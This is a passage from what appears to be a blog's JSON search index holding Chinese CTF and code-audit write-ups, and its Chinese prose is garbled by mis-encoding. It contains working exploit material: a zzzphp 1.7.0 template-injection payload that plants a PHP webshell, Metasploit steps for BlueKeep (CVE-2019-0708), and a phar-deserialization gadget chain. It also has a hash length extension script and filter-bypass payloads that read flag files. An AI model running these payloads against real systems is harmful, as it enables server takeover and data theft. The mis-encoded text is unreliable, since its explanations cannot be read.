ç¬¬å››å¤„æ˜¯sqlæ’å…¥æ•°æ®åº“çš„æ•°æ®æ²¡æœ‰è¿›è¡Œå¤„ç†ï¼Œæ¯”å¦‚å¯ä»¥å®ä½“ç¼–ç ï¼Œä½†æ˜¯è¿™æ ·å¯èƒ½åŠŸèƒ½å®ç°æ–¹é¢ä¼šä¸åŒã€‚ å¤ç°å®Œäº†å››ä¸ªdedecmsï¼Œå‘ç°ç½‘ä¸Šè¿˜æœ‰å¥½å¤šdedecmsçš„æ¼æ´ï¼Œæ˜å¤©å¯ä»¥å†å†™ä¸€ç¯‡ã€‚ã€‚ã€‚ å› ä¸ºåˆšåˆšå¼€å§‹ä»£ç å®¡è®¡ï¼Œç°åœ¨ä¸»è¦è¿˜æ˜¯è·Ÿç€å¤ç°ï¼Œå¯ä»¥å…ˆæ ¹æ®paylaodè‡ªå·±è¿›è¡Œåˆ†æï¼Œå¹¶ä¸”æŸä¸ªå­˜åœ¨æ¼æ´phpæ–‡ä»¶ä¸­å¯èƒ½å­˜åœ¨ä¸æ­¢ä¸€ä¸ªè§¦å‘æ¼æ´çš„å‡½æ•°ï¼Œä¹Ÿå¯ä»¥å¤šå°è¯•å…¶ä»–å‡½æ•° å‚è€ƒé“¾æ¥https://mochazz.github.io https://zhzhdoai.github.io https://xz.aliyun.com/t/2237","categories":[],"tags":[{"name":"phpä»£ç å®¡è®¡","slug":"phpä»£ç å®¡è®¡","permalink":"https://glotozz.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"zzzphp1.7.0è¿œç¨‹ä»£ç æ‰§è¡Œåˆ†æ","slug":"zzzphp1-7-0è¿œç¨‹ä»£ç æ‰§è¡Œåˆ†æ","date":"2019-09-19T09:45:25.000Z","updated":"2020-03-28T00:59:37.712Z","comments":true,"path":"2019/09/19/zzzphp1-7-0è¿œç¨‹ä»£ç æ‰§è¡Œåˆ†æ/","link":"","permalink":"https://glotozz.github.io/2019/09/19/zzzphp1-7-0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• ä¸€ã€è·å–æ¼æ´ äºŒã€æ¼æ´å®ç° ä¸‰ã€æ¼æ´åˆ†æ å››ã€æ¼æ´ä¿®å¤ å‚è€ƒé“¾æ¥ ä¸€ã€è·å–æ¼æ´zzzphp1.7.0è¿œç¨‹ä»£ç æ‰§è¡Œ äºŒã€æ¼æ´å®ç°ç®¡ç†å‘˜åå°-æ¨¡æ¿ç®¡ç†-html-search.php ä¿®æ”¹ï¼ˆå¢åŠ ï¼‰å¦‚ä¸‹ 1&#123;if:1)file_put_contents(str_replace(&#39;*&#39;,&#39;&#39;,&#39;glotozz.pphphp&#39;),str_replace(&#39;*&#39;,&#39;&#39;,&#39;&lt;?pphphp evevalal(ggetet_defined_vars()[_PPOSTOST][1]);&#39;));&#x2F;&#x2F;&#125;&#123;end if&#125; è®¿é—®ç”Ÿæˆæˆ‘ä»¬çš„æ¶æ„æ–‡ä»¶ 1http:&#x2F;&#x2F;127.0.0.1&#x2F;zzzctf&#x2F;search&#x2F; ä¸‰ã€æ¼æ´åˆ†æ æ¼æ´æˆå› æœ€ä¸»è¦è¿˜æ˜¯ä½¿ç”¨str_ireplace()å‡½æ•°æ¥è¿‡æ»¤ç”¨æˆ·è¾“å…¥ï¼Œå¯¼è‡´å¯ä»¥åŒå†™ç»•è¿‡ index.phpå¼•å…¥&#39;inc/zzz_client.php&#39;; åœ¨zzz_client.phpä¸­å¼•å…¥æ¨¡æ¿å¹¶ä½¿ç”¨getlocation() switchåŒ¹é…searchæ¨¡æ¿ å®ä¾‹åŒ–æ¨¡æ¿ï¼Œè°ƒç”¨parseCommon() æŸ¥çœ‹parseCommon()å‡½æ•°ï¼Œå­˜åœ¨parserIfLabel() æ­£åˆ™åŒ¹é…{if:xxx}xxx{end if}ï¼Œç”¨æˆ·ä¼ å…¥çš„æ•°æ®ç”¨danger_key()è¿‡æ»¤ è·Ÿè¸ªdanger_key()ï¼Œä½¿ç”¨str_ireplace()å°†ç”¨æˆ·å…³é”®è¯æ›¿æ¢ä¸º*ï¼Œä¹‹åç›´æ¥è¿›å…¥eval()å‡½æ•° å› æ­¤ï¼Œæˆ‘ä»¬è€ƒè™‘ç”¨str_replace()å°†*æ›¿æ¢ä¸ºç©ºï¼Œ$è¢«æ›¿æ¢æˆ‘ä»¬å¯ä»¥ä½¿ç”¨get_defined_vars()æ¥è·å–å‚æ•°ï¼Œä¹‹å‰codebreaking-4ä¸­ä¹Ÿæœ‰æ¶‰åŠï¼Œapacheä¸­å¯ä»¥ä½¿ç”¨getallheaders(),nginxä½¿ç”¨get_defined_vars() æ„é€ payloadï¼ˆå‚è€ƒé“¾æ¥é‡Œé¢çš„å¸ˆå‚…ï¼‰ 1&#123;if:1)file_put_contents(str_replace(&#39;*&#39;,&#39;&#39;,&#39;glotozz.pphphp&#39;),str_replace(&#39;*&#39;,&#39;&#39;,&#39;&lt;?pphphp evevalal(ggetet_defined_vars()[_PPOSTOST][1]);&#39;));&#x2F;&#x2F;&#125;&#123;end if&#125; å…·ä½“æ‰§è¡Œä»£ç  1ã€//é—­åˆåé¢çš„æ‹¬å·) 123&lt;?php $a &#x3D; &#39;1)phpinfo();&#x2F;&#x2F;&#39;; eval(&#39;if(1&#39;.$a.&#39;)&#39;); 2ã€ 3ã€ 12341)file_put_contents(str_replace(&#39;*&#39;,&#39;&#39;,&#39;glotozz.p*hp&#39;),str_replace(&#39;*&#39;,&#39;&#39;,&#39;&lt;?p*hp ev*al(g*et_defined_vars()[_P*OST][1]);&#39;));&#x2F;&#x2F;&#x3D;&#x3D;&gt;@eval(&#39;if(1)file_put_contents(str_replace(&#39;*&#39;,&#39;&#39;,&#39;glotozz.p*hp&#39;),str_replace(&#39;*&#39;,&#39;&#39;,&#39;&lt;?p*hp ev*al(g*et_defined_vars()[_P*OST][1]);&#39;));&#x2F;&#x2F;&#39;) å››ã€æ¼æ´ä¿®å¤ä¸ä½¿ç”¨str_replace()æ›¿æ¢å…³é”®å­—ï¼Œä½¿ç”¨preg_replace()ç›´æ¥è¿‡æ»¤å…³é”®å­— ç¬¬ä¸€æ¬¡å†™æ¼æ´å¤ç°ï¼Œå‚è€ƒé“¾æ¥é‡Œçš„å¸ˆå‚…å’ŒåŠ›å“¥å†™çš„ï¼Œè¿™æ¬¡çœèµ›å›æ¥ä¹‹åå°±å®‰å¿ƒä»£ç å®¡è®¡æŠŠï¼Œæˆ‘çš„ctfåˆšå…¥é—¨å°±å…¥åœŸäº†ã€‚ğŸ˜‚ å‚è€ƒé“¾æ¥https://xz.aliyun.com/t/6068#toc-5 https://zhzhdoai.github.io/2019/08/25/zzzphp1-7-0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/","categories":[],"tags":[{"name":"phpä»£ç å®¡è®¡","slug":"phpä»£ç å®¡è®¡","permalink":"https://glotozz.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"CVE-2019-0708-RCEå¤ç°","slug":"CVE-2019-0708-RCEå¤ç°","date":"2019-09-09T23:25:49.000Z","updated":"2020-03-31T01:04:19.379Z","comments":true,"path":"2019/09/10/CVE-2019-0708-RCEå¤ç°/","link":"","permalink":"https://glotozz.github.io/2019/09/10/CVE-2019-0708-RCE%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• 1ã€å‡†å¤‡é¶æœº äºŒã€å‡†å¤‡kali ä¸‰ã€å¼€å§‹æ”»å‡» å››ã€é¶æœºå»ºè®®é‡æ–°å®‰è£…ä¸€å°win7sp1ï¼Œè¦å…è®¸ä»»ä½•äººè¿œç¨‹æ¡Œé¢è¿æ¥ å‚è€ƒé“¾æ¥ 1ã€å‡†å¤‡é¶æœº é¶æœºæ˜¯win7ï¼ˆcn_windows_7_enterprise_x64_dvd_x15-70741ï¼‰ï¼Œä¹‹å‰å¤ç°æ°¸æ’ä¹‹è“ä¹Ÿæ˜¯ç”¨å®ƒ å¼€å¯è¿œç¨‹è¿æ¥æœåŠ¡ï¼ˆ3389ç«¯å£ï¼‰ æŸ¥çœ‹ç«¯å£ å…³é—­é˜²ç«å¢™ äºŒã€å‡†å¤‡kalikaliç¯å¢ƒå®‰è£…æ›´æ–° 12345curl https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;rapid7&#x2F;metasploit-omnibus&#x2F;master&#x2F;config&#x2F;templates&#x2F;metasploit-framework-wrappers&#x2F;msfupdate.erb &gt; msfinstallchmod 755 msfinstall .&#x2F;msfinstall ä¸‹è½½æ”»å‡»å¥—ä»¶æ”¾ç½®æ–‡ä»¶åˆ°msfçš„ç›¸åº”æ–‡ä»¶å¤¹(å¦‚æœå·²å­˜åœ¨åŒåæ–‡ä»¶,ç›´æ¥è¦†ç›–å³å¯) 1234567rdp.rb -&gt; &#x2F;opt&#x2F;metasploit-framework&#x2F;embedded&#x2F;framework&#x2F;lib&#x2F;msf&#x2F;core&#x2F;exploit&#x2F;rdp.rbrdp_scanner.rb -&gt; &#x2F;opt&#x2F;metasploit-framework&#x2F;embedded&#x2F;framework&#x2F;modules&#x2F;auxiliary&#x2F;scanner&#x2F;rdp&#x2F;rdp_scanner.rbcve_2019_0708_bluekeep.rb -&gt; &#x2F;opt&#x2F;metasploit-framework&#x2F;embedded&#x2F;framework&#x2F;modules&#x2F;auxiliary&#x2F;scanner&#x2F;rdp&#x2F;cve_2019_0708_bluekeep.rbcve_2019_0708_bluekeep_rce.rb -&gt; &#x2F;opt&#x2F;metasploit-framework&#x2F;embedded&#x2F;framework&#x2F;modules&#x2F;exploits&#x2F;windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce.rb ä¸‰ã€å¼€å§‹æ”»å‡»è¿›å…¥msfconsole 1234.&#x2F;msfconsolereload_alluse exploit&#x2F;windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rceinfoæŸ¥çœ‹ç›¸å…³ä¿¡æ¯ 1234#ä½¿ç”¨set target IDæ•°å­—(å¯é€‰ä¸º0-4)è®¾ç½®å—å®³æœºæœºå™¨æ¶æ„ 1-å®ä½“æœº 2-VirtualBox 3-VMware 4-Hyper-vset target 3set RHOST 192.168.6.111run è“å±äº†ã€‚ã€‚ã€‚ï¼Œæ— æ³•åå¼¹shell å››ã€é¶æœºå»ºè®®é‡æ–°å®‰è£…ä¸€å°win7sp1ï¼Œè¦å…è®¸ä»»ä½•äººè¿œç¨‹æ¡Œé¢è¿æ¥ed2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/ åŒæ ·çš„æ“ä½œ å‚è€ƒé“¾æ¥https://github.com/mai-lang-chai/CVE-2019-0708-RCE?tdsourcetag=s_pctim_aiomsg","categories":[],"tags":[]},{"title":"bytectf-wp","slug":"bytectf-wp","date":"2019-09-08T22:55:06.000Z","updated":"2020-03-31T01:01:15.100Z","comments":true,"path":"2019/09/09/bytectf-wp/","link":"","permalink":"https://glotozz.github.io/2019/09/09/bytectf-wp/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• Ezcms ä¸¾ä¸ªæ —å­demo1ï¼ˆç”Ÿæˆï¼‰ demo2ï¼ˆfile_get_contents()ä¸ºä¾‹ï¼‰ demo3 æ€»ç»“åˆ©ç”¨æ¡ä»¶ Boring_code å‚è€ƒé“¾æ¥ æ€è·¯æ¥æºROIS Ezcmsè€ƒç‚¹ï¼šhashé•¿åº¦æ‰©å±•æ”»å‡»ï¼Œpharååºåˆ—åŒ–ï¼Œphpè‡ªç”¨ç±»ZipArchive hashé•¿åº¦æ‰©å±•æ”»å‡»ä¸éš¾ï¼Œpharååºåˆ—åŒ–ä¹Ÿåœ¨buuctfä¸Šçš„Dropboxæ¥è§¦è¿‡ï¼Œå¯ä»¥äº†è§£ä¸€ä¸‹ å…ˆç®€å•æ•´ç†ä¸€ä¸‹pharæ‹“å±•ååºåˆ—åŒ–æ¼æ´ è¯¥æ–¹æ³•åœ¨æ–‡ä»¶ç³»ç»Ÿå‡½æ•°ï¼ˆfile_exists()ã€is_dir()ç­‰ï¼‰å‚æ•°å¯æ§çš„æƒ…å†µä¸‹ï¼Œé…åˆphar://ä¼ªåè®®ï¼Œå¯ä»¥ä¸ä¾èµ–unserialize()ç›´æ¥è¿›è¡Œååºåˆ—åŒ–æ“ä½œã€‚ pharæ–‡ä»¶ç»“æ„å¯ä»¥å‚è€ƒé“¾æ¥ï¼Œå†™çš„å¾ˆè¯¦ç»†ã€‚ ä¸¾ä¸ªæ —å­demo1ï¼ˆç”Ÿæˆï¼‰ php.iniä¸­çš„phar.readonlyé€‰é¡¹è®¾ç½®ä¸ºOffï¼Œå¦åˆ™æ— æ³•ç”Ÿæˆphar 1234567891011121314&lt;?php class TestObject &#123; &#125; @unlink(&quot;phar.phar&quot;); $phar &#x3D; new Phar(&quot;phar.phar&quot;); &#x2F;&#x2F;åç¼€åå¿…é¡»ä¸ºphar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;è®¾ç½®stub $o &#x3D; new TestObject(); $phar-&gt;setMetadata($o); &#x2F;&#x2F;å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ &#x2F;&#x2F;ç­¾åè‡ªåŠ¨è®¡ç®— $phar-&gt;stopBuffering();?&gt; ç”Ÿæˆphar.pharï¼Œæ”¾å…¥winhaxæŸ¥çœ‹ å‘ç°ä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ï¼Œé‚£ä¹ˆè¯»å–çš„æ—¶å€™å¿…å®šå­˜åœ¨ååºåˆ—åŒ–ã€‚ åœ¨é€šè¿‡phar://ä¼ªåè®®è§£æpharæ–‡ä»¶æ—¶ä¼šå°†meta-dataï¼ˆç”¨æˆ·è‡ªå®šä¹‰çš„ï¼‰ååºåˆ—åŒ–çš„æ–‡ä»¶å‡½æ•°æœ‰å¦‚ä¸‹ï¼š demo2ï¼ˆfile_get_contents()ä¸ºä¾‹ï¼‰ demo3 å¯ä»¥ä¿®æ”¹æ–‡ä»¶å¤´å’Œåç¼€åæ¥ä¼ªè£…å…¶ä»–æ ¼å¼ 1234567891011121314&lt;?php class TestObject &#123; &#125; @unlink(&quot;phar.phar&quot;); $phar &#x3D; new Phar(&quot;phar.phar&quot;); $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;è®¾ç½®stubï¼Œå¢åŠ gifæ–‡ä»¶å¤´ $o &#x3D; new TestObject(); $phar-&gt;setMetadata($o); &#x2F;&#x2F;å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ &#x2F;&#x2F;ç­¾åè‡ªåŠ¨è®¡ç®— $phar-&gt;stopBuffering();?&gt; ä¿®æ”¹ä¸ºphar.gifå³å¯ æ€»ç»“åˆ©ç”¨æ¡ä»¶ pharæ–‡ä»¶èƒ½ä¸Šä¼ åˆ°æœåŠ¡å™¨ç«¯ å­˜åœ¨æŸä¸ªå¯ç”¨çš„é­”æœ¯æ–¹æ³•ä½œä¸ºè·³æ¿ æ–‡ä»¶æ“ä½œå‡½æ•°çš„å‚æ•°å¯æ§ï¼Œä¸”èƒ½åˆ©ç”¨phar://åè®® æœ¬é¢˜ æ‰«æå‘ç°å­˜åœ¨www.zipæ–‡ä»¶æ³„éœ² index.php 123456789101112131415161718&lt;?phperror_reporting(0);include(&#39;config.php&#39;);if (isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;]))&#123; $username &#x3D; $_POST[&#39;username&#39;]; $password &#x3D; $_POST[&#39;password&#39;]; $username &#x3D; urldecode($username); $password &#x3D; urldecode($password); if ($password &#x3D;&#x3D;&#x3D; &quot;admin&quot;)&#123; die(&quot;u r not admin !!!&quot;); &#125; $_SESSION[&#39;username&#39;] &#x3D; $username; $_SESSION[&#39;password&#39;] &#x3D; $password; if (login())&#123; echo &#39;&lt;script&gt;location.href&#x3D;&quot;upload.php&quot;;&lt;&#x2F;script&gt;&#39;; &#125;&#125; config.php 12345678910111213141516171819function login()&#123; $secret &#x3D; &quot;********&quot;; setcookie(&quot;hash&quot;, md5($secret.&quot;adminadmin&quot;)); return 1;&#125;function is_admin()&#123; $secret &#x3D; &quot;********&quot;; $username &#x3D; $_SESSION[&#39;username&#39;]; $password &#x3D; $_SESSION[&#39;password&#39;]; if ($username &#x3D;&#x3D; &quot;admin&quot; &amp;&amp; $password !&#x3D; &quot;admin&quot;)&#123; if ($_COOKIE[&#39;user&#39;] &#x3D;&#x3D;&#x3D; md5($secret.$username.$password))&#123; return 1; &#125; &#125; return 0;&#125; hashé•¿åº¦æ‰©å±•æ”»å‡» 123456import hashpumpyimport urllibs &#x3D; &quot;52107b08c0f3342d2153ae1d68e6262c&quot;m&#x3D;hashpumpy.hashpump(s,&#39;adminadmin&#39;,&#39;admin1&#39;,8)print m[0]print urllib.quote(m[1]) æ³¨æ„usernameå’Œpasswordä¼šå­˜åœ¨sessionä¸­ï¼Œæ‰€ä»¥ä¸€å¼€å§‹ç™»å½•æ—¶(index.php)å°±ä¼ å…¥adminå’Œå¾—åˆ°çš„m[1]ï¼Œå†ä¸Šä¼ çš„æ—¶å€™åŠ ä¸Šcookieï¼šuser=m[0] å†cookieä¸­åŠ ä¸Šuser æˆåŠŸä¸Šä¼ ï¼ï¼ğŸ‘Œ ä»¥ååšé¢˜ä¸€å®šè¦çœ‹æ¸…æ¥šurlï¼Œä¸èƒ½æ ¹æ®é¡µé¢åˆ¤æ–­ï¼Œåˆ«é—®æˆ‘æ€ä¹ˆçŸ¥é“çš„ï¼Œæˆ‘è£‚å¼€äº† ç™»å½•æˆåŠŸå è§‚å¯ŸAdminç±»ï¼Œä¼šæ”¾ç”¨æˆ·æ²™ç®±æ”¾ä¸€ä¸ªé”™è¯¯æ ¼å¼çš„.htaccessï¼Œå¯¼è‡´ç”¨æˆ·ä¼šè®¿é—®å‡ºç°500é”™è¯¯ å¦‚æœèƒ½åˆ©ç”¨Adminç±»çš„uplaod_file()æ–¹æ³•æŠŠè¿™ä¸ª.htaccessç§»èµ°å°±å¥½å•¦ï¼Œä½†æ˜¯è¿™é‡Œåªèƒ½moveç”¨æˆ·postä¸Šä¼ çš„æ–‡ä»¶ã€‚ 123è¿˜æœ‰ä¸€ä¸ªProfileç±»ï¼Œæœ‰ä¸ªcallæ–¹æ³•ï¼Œå¹¶ä¸”$adminæ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ï¼Œæœäº†ä¸€ä¸‹PHPæœ‰ä¸ªè‡ªç”¨ç±»ZipArchiveï¼Œå½“ç¬¬äºŒä¸ªå‚æ•°ä¸ºZIPARCHIVE::OVERWRITE æ—¶ï¼Œå¯ä»¥å¯¹å·²ç»å­˜åœ¨çš„æ–‡ä»¶è¿›è¡Œè¦†ç›–æ“ä½œã€‚å¹¶ä¸”å¯ä»¥é€šè¿‡Fileç±»çš„__destruct()è§¦å‘Profileç±»çš„__call()ï¼Œå¹¶ä¸”åˆ©ç”¨ZipArchiveç±»æ¥é‡å†™.htaccess æœç´¢ ::open exp 123456789101112131415161718192021222324252627282930313233343536&lt;?php class File&#123; public $filename; public $filepath; public $checker; function __construct() &#123; $this-&gt;checker = new Profile(); &#125; function __destruct() &#123; if (isset($this-&gt;checker)) &#123; $this-&gt;checker-&gt;upload_file(); &#125; &#125; &#125; class Profile&#123; public $username; public $password; public $admin; function __construct() &#123; $this-&gt;admin = new ZipArchive; $this-&gt;username = '/var/www/html/sandbox/848516b9a263eb46fd487ce1cd295f06/.htaccess'; $this-&gt;password = ZIPARCHIVE::OVERWRITE; &#125; function __call($name, $arguments) &#123; $this-&gt;admin-&gt;open($this-&gt;username, $this-&gt;password); &#125; &#125; @unlink(\"phar.phar\"); $phar = new Phar(\"phar.phar\"); //åç¼€åå¿…é¡»ä¸ºphar $phar-&gt;startBuffering(); $phar-&gt;setStub(\"&lt;?php __HALT_COMPILER();?&gt;\"); //è®¾ç½®stub $o = new File(); $phar-&gt;setMetadata($o); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest $phar-&gt;addFromString(\"test.txt\", \"test\"); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ //ç­¾åè‡ªåŠ¨è®¡ç®— $phar-&gt;stopBuffering(); ä¸Šä¼ sandbox/fd40c7f4125a9b9ff1a4e75d293e3080/9c7f4a2fbf2dd3dfb7051727a644d99f.phar view.phpä¸­è®¿é—®ï¼Œåˆ©ç”¨php://filterç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼å¯¹pharçš„è¿‡æ»¤ 12view.php?filename&#x3D;&amp;filepath&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;phar:&#x2F;&#x2F;sandbox&#x2F;848516b9a263eb46fd487ce1cd295f06&#x2F;3a9958c0490c6d5f6ca6d3fa1d23ed04.phar å†ä¼ ä¸ªï¼Œè¿™é‡Œevalç­‰é»‘åå•=ã€‚=ï¼Œå› æ­¤ä¸è€ƒè™‘RCEäº† 123&lt;?php var_dump(file_get_contents(&quot;&#x2F;flag&quot;));?&gt; 123&lt;?php include(&#39;&#x2F;flag&#39;);?&gt; è®¿é—®å³å¯ Boring_code12345678910111213141516171819202122232425262728293031323334&lt;?php function is_valid_url($url) &#123; if (filter_var($url, FILTER_VALIDATE_URL)) &#123; if (preg_match('/data:\\/\\//i', $url)) &#123; return false; &#125; return true; &#125; return false; &#125; if (isset($_POST['url']))&#123; $url = $_POST['url']; if (is_valid_url($url)) &#123; $r = parse_url($url); if (preg_match('/baidu\\.com$/', $r['host'])) &#123; $code = file_get_contents($url); if (';' === preg_replace('/[a-z]+\\((?R)?\\)/', NULL, $code)) &#123; if (preg_match('/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i', $code)) &#123; echo 'bye~'; &#125; else &#123; eval($code); &#125; &#125; &#125; else &#123; echo \"error: host not allowed\"; &#125; &#125; else &#123; echo \"error: invalid url\"; &#125; &#125;else&#123; highlight_file(__FILE__); &#125;?&gt; ä¸‰å±‚è¿‡æ»¤ã€‚ã€‚ã€‚ ä¸€ã€filter_var()å‡½æ•°æ£€æŸ¥urlçš„åˆæ³•æ€§ï¼Œä¸èƒ½åŒ…å«data:// äºŒã€parse_url()è§£æurlçš„hostå¿…é¡»ä»¥baidu.comç»“å°¾ ä¸‰ã€æ­£åˆ™åŒ¹é…å­—æ¯ï¼Œ(?R)æ˜¯å¼•ç”¨å½“å‰è¡¨è¾¾å¼çš„æ„æ€ï¼Œç›¸å½“äº/[a-z]+()/å¾ªç¯åŒ¹é…ï¼Œæœ€ååªå‰©ä¸‹åˆ†å·ï¼Œå†ä¸€æ¬¡æ­£åˆ™åŒ¹é…è¿‡æ»¤å«et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log å¯¹äº1ã€2æ­¥ï¼Œfilter_var()å¯¹äºä¸‹é¢çš„ä¼šè¿”å›trueï¼Œä½†æ˜¯file_get_contents()æ˜¯è¯»å–ä¸åˆ°è¿™ç§æ ¼å¼çš„ 1230:&#x2F;&#x2F;evil.com;goole.com0:&#x2F;&#x2F;evil.com:80;goole.com:800:&#x2F;&#x2F;evil.com:80\\goole.com:80 ç„¶åè§£å†³åŠæ³•æ˜¯åˆ©ç”¨ç™¾åº¦çš„é‡å®šå‘åˆ°æˆ‘ä»¬çš„vps å°†jump.bdimg.comæ›¿æ¢ä¸ºpost.baidu.comå°±è¡Œï¼ˆå¦‚æœæ˜¯tieba.baidu.comä¼šç»è¿‡ä¸€æ¬¡é‡å®šå‘ç¡®è®¤ï¼‰ 1http:&#x2F;&#x2F;post.baidu.com&#x2F;safecheck&#x2F;index?url&#x3D;x+Z5mMbGPAuxvzMQ1JtsluyAASn3sWLlrv9d2NrzuKbjKs5SMwD6pElPPJrrtcEVomErKkpqfg2pp+mC+8YGv66a3rkR4NVhredtiNPp&#x2F;vJz3AtxgIS8yHY9qHh6BM0y èƒ½é‡å®šå‘åˆ°æˆ‘ä»¬çš„vpså•¦ğŸ˜ è¦urlç¼–ç ä¸€ä¸‹ï¼Œå¦åˆ™ä¼šinvalid 1http%3a%2f%2fpost.baidu.com%2fsafecheck%2findex%3furl%3dx%2bZ5mMbGPAuxvzMQ1JtsluyAASn3sWLlrv9d2NrzuKbjKs5SMwD6pElPPJrrtcEVomErKkpqfg2pp%2bmC%2b8YGv66a3rkR4NVhredtiNPp%2fvJz3AtxgIS8yHY9qHh6BM0y ç¬¬3æ­¥æ˜¯ç®€å•æ¥è¯´å°±æ˜¯åªèƒ½æ‰§è¡Œä¸€ä¸ªå‡½æ•°ï¼Œä½†ä¸èƒ½è®¾ç½®å‚æ•°ï¼Œcodebreakingä¸­é‡åˆ°è¿‡ï¼Œå½“æ—¶paylaodæ˜¯ 1readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd()))))))); æ‰€ä»¥ï¼Œæ’é™¤ç›´æ¥è·å–è·¯å¾„ï¼Œæˆ‘ä»¬åªèƒ½å¤Ÿé€šè¿‡æ„é€ å­—ç¬¦.æ¥è·å–è·¯å¾„ readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));é€šè¿‡å„ç§å°è¯•ï¼Œæœ€åå‘ç°äº†ä¸€ç§å‡½æ•°time()ï¼Œä»–èƒ½æ ¹æ®æ—¶é—´çš„ä¸åŒæ¥è¿”å›ä¸åŒçš„æ•´æ•°,å†åˆ©ç”¨chr()è¿”å›å­—æ¯ æœ€åæ„é€  1readfile(end(scandir(chr(time(chdir(next(scandir(chr(time()))))))))); å…¶ä¸­ç¬¬ä¸€ä¸ªchr(time())å–åˆ° . æ—¶ï¼Œåˆ—å‡ºå½“å‰ç›®å½• next()å–åˆ° .. chdir(â€˜..â€™)è¿”å›ä¸Šä¸€çº§ç›®å½•ï¼Œè¿”å›å€¼å¦‚æœæˆåŠŸå°±æ˜¯Trueï¼Œå¤±è´¥å°±æ˜¯False time(True) é‡Œé¢çš„å‚æ•°ä¸å½±å“ä»è¿”å› . end()å–åˆ°æœ€åä¸€ä¸ªæ–‡ä»¶ æœ€åç”¨bpçˆ†ç ´ä¸‹å°±è¡Œï¼Œé¢˜ç›®ç¯å¢ƒå…³äº†ï¼Œæˆ‘è£‚å¼€äº†ã€‚ ç”¨vpsæ­ä¸€ä¸‹ï¼Œåˆå‘ç°ä¸€ä¸ªå¾ˆå¥‡æ€ªçš„é—®é¢˜ã€‚ã€‚ã€‚ æ˜æ˜æ‰“å°$code=&quot;readfile(end(scandir(chr(time(chdir(next(scandir(chr(time())))))))));&quot; æ‰“å°preg_replace(&#39;/[a-z]+\\((?R)?\\)/&#39;, NULL, $code) ä¸º ; ä½†æ˜¯å´è¿›ä¸äº†å¾ªç¯ ç»è¿‡éŸ©å¸ˆå‚…çš„æé†’ï¼Œæ˜¯åœ¨viæ¨¡å¼ä¸‹è¾“å…¥ç»“æŸåè‡ªåŠ¨æ·»åŠ äº†ä¸ªæ¢è¡Œï¼Œæˆ‘æŸ¥çœ‹äº†ä¸€ä¸‹ç¡®å®å¦‚æ­¤ã€‚å†windowsä¸‹å†™å¥½ä¸Šä¼ å³å¯ï¼Œ æˆåŠŸäº† å‚è€ƒé“¾æ¥https://paper.seebug.org/680/ https://paper.seebug.org/561/#parse_urllibcurlurlssrf https://paper.seebug.org/561/ https://www.4xseo.com/marketing/1280/#title-0","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"XNUCA-EZPHP-wp","slug":"XNUCA-EZPHP-wp","date":"2019-09-01T23:13:56.000Z","updated":"2020-03-31T00:21:09.158Z","comments":true,"path":"2019/09/02/XNUCA-EZPHP-wp/","link":"","permalink":"https://glotozz.github.io/2019/09/02/XNUCA-EZPHP-wp/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• æºç  12345678910111213141516171819202122232425262728293031323334&lt;?php $files = scandir('./'); foreach($files as $file) &#123; if(is_file($file))&#123; if ($file !== \"index.php\") &#123; unlink($file); &#125; &#125; &#125; include_once(\"fl3g.php\"); if(!isset($_GET['content']) || !isset($_GET['filename'])) &#123; highlight_file(__FILE__); die(); &#125; $content = $_GET['content']; if(stristr($content,'on') || stristr($content,'html') || stristr($content,'type') || stristr($content,'flag') || stristr($content,'upload') || stristr($content,'file')) &#123; echo \"Hacker\"; die(); &#125; $filename = $_GET['filename']; if(preg_match(\"/[^a-z\\.]/\", $filename) == 1) &#123; echo \"Hacker\"; die(); &#125; $files = scandir('./'); foreach($files as $file) &#123; if(is_file($file))&#123; if ($file !== \"index.php\") &#123; unlink($file); &#125; &#125; &#125; file_put_contents($filename, $content . \"\\nJust one chance\"); ?&gt; 